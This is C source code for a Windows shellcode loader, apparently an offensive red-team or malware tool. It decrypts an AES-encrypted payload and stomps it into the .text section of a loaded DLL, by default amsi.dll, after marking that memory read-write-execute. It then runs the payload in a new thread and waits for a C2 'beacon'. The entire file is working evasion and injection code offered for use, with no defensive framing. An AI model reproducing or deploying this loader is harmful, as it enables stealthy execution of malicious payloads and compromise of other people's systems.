static BOOL GetTextSection(HMODULE hMod, PVOID* outBase, DWORD* outSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            *outBase = (PVOID)((PBYTE)hMod + sec->VirtualAddress);
            *outSize = sec->SizeOfRawData;
            return TRUE;
        }
    }
    return FALSE;
}

static PVOID GetDllEntryPoint(HMODULE hMod) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + dos->e_lfanew);
    DWORD epRva = nt->OptionalHeader.AddressOfEntryPoint;
    if (epRva == 0) return NULL;
    return (PVOID)((PBYTE)hMod + epRva);
}

// ------------------------------------------------------------------
// Main program
// ------------------------------------------------------------------
int main(int argc, char* argv[]) {
    // 1. Determine the DLL to use (can be specified on the command line; defaults to amsi.dll)
    const char* dllPath = (argc > 1) ? argv[1] : "C:\\Windows\\System32\\amsi.dll";

    // ============================================================
    // 2. AES-256-CBC decrypt the shellcode (replaces the original XOR part)
    // ============================================================
    int            payload_len = sizeof(shellcode_aes_payload);
    unsigned char* shellcode = NULL;
    int            shellcodeLen = 0;

    if (payload_len == 0) {
        printf("[-] Encrypted shellcode is empty!\n");
        return 1;
    }
    printf("[+] Encrypted payload size: %d bytes\n", payload_len);

    if (!aes_decrypt_payload(shellcode_aes_payload, payload_len,
        &shellcode, &shellcodeLen)) {
        printf("[-] AES decryption failed!\n");
        return 1;
    }

    printf("[+] AES decryption done: %d bytes (payload was %d bytes)\n",
        shellcodeLen, payload_len);

    // Print the first few bytes for debugging
    if (shellcodeLen >= 2) {
        printf("[*] Decrypted first bytes: %02X %02X", shellcode[0], shellcode[1]);
        if (shellcode[0] == 0xFC && shellcode[1] == 0x48)
            printf(" (x64 shellcode)\n");
        else if (shellcode[0] == 0xFC && shellcode[1] == 0xE8)
            printf(" (x86 shellcode - make sure you compiled as x86!)\n");
        else
            printf(" (unusual header - verify your shellcode)\n");
    }

    // 3. Load the target DLL (used for stomping)
    printf("[*] Loading DLL: %s\n", dllPath);
    HMODULE hModule = LoadLibraryA(dllPath);
    if (!hModule) {
        printf("[-] LoadLibraryA failed: %lu\n", GetLastError());
        free(shellcode);
        return 1;
    }
    printf("[+] DLL base: 0x%p\n", (void*)hModule);

    // 4. Locate the .text section
    PVOID textBase = NULL;
    DWORD textSize = 0;
    if (!GetTextSection(hModule, &textBase, &textSize)) {
        printf("[-] Cannot find .text section in DLL\n");
        FreeLibrary(hModule);
        free(shellcode);
        return 1;
    }
    printf("[+] .text section: 0x%p, size: %lu bytes\n", textBase, textSize);

    // 5. Check whether the shellcode is too large
    if ((DWORD)shellcodeLen > textSize) {
        printf("[-] FAIL: shellcode (%d) > .text section (%lu)\n",
            shellcodeLen, textSize);
        printf("    Use a staged payload or a larger DLL\n");
        FreeLibrary(hModule);
        free(shellcode);
        return 1;
    }

    // 6. Determine the write location (prefer the DLL entry point)
    PVOID writeTarget = GetDllEntryPoint(hModule);
    if (writeTarget == NULL ||
        writeTarget < textBase ||
        (PBYTE)writeTarget >= (PBYTE)textBase + textSize) {
        printf("[!] Entry point outside .text, using .text base\n");
        writeTarget = textBase;
    }

    DWORD availableSpace = (DWORD)((PBYTE)textBase + textSize - (PBYTE)writeTarget);
    if ((DWORD)shellcodeLen > availableSpace) {
        printf("[!] Not enough space from EP, using .text base\n");
        writeTarget = textBase;
    }
    printf("[+] Write target: 0x%p\n", writeTarget);

    // 7. Change the memory protection to RWX
    DWORD oldProtect = 0;
    if (!VirtualProtect(writeTarget, shellcodeLen, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect(RWX) failed: %lu\n", GetLastError());
        FreeLibrary(hModule);
        free(shellcode);
        return 1;
    }
    printf("[+] Memory set to RWX\n");

    // 8. Write the shellcode
    memcpy(writeTarget, shellcode, shellcodeLen);
    printf("[+] Shellcode written (%d bytes)\n", shellcodeLen);
    free(shellcode);  // already written to the DLL .text section; free the local buffer

    // 9. Create a thread to execute
    printf("[*] Creating execution thread at 0x%p ...\n", writeTarget);
    HANDLE hThread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)writeTarget,
        NULL, 0, NULL);
    if (!hThread) {
        printf("[-] CreateThread failed: %lu\n", GetLastError());
        FreeLibrary(hModule);
        return 1;
    }
    printf("[+] Thread created (TID: %lu)\n", GetThreadId(hThread));

    // 10. Wait for the thread (diagnostic)
    DWORD waitResult = WaitForSingleObject(hThread, 5000);
    if (waitResult == WAIT_TIMEOUT) {
        printf("[+] Thread alive after 5s - shellcode executing\n");
        printf("[*] Waiting for beacon... (Ctrl+C to abort)\n");
        WaitForSingleObject(hThread, INFINITE);
    }
    else if (waitResult == WAIT_OBJECT_0) {
        DWORD exitCode = 0;
        GetExitCodeThread(hThread, &exitCode);
        printf("[-] Thread exited early! Exit code: 0x%lX\n", exitCode);
        if (exitCode == EXCEPTION_ACCESS_VIOLATION)
            printf("[-] ACCESS_VIOLATION: shellcode crashed (arch mismatch?)\n");
        else if (exitCode == 0)
            printf("[-] Clean exit: stager may have failed to connect\n");
        else
            printf("[-] Unexpected exit code - check shellcode\n");
    }

    // 11. Cleanup
    CloseHandle(hThread);
    FreeLibrary(hModule);
    return 0;
}
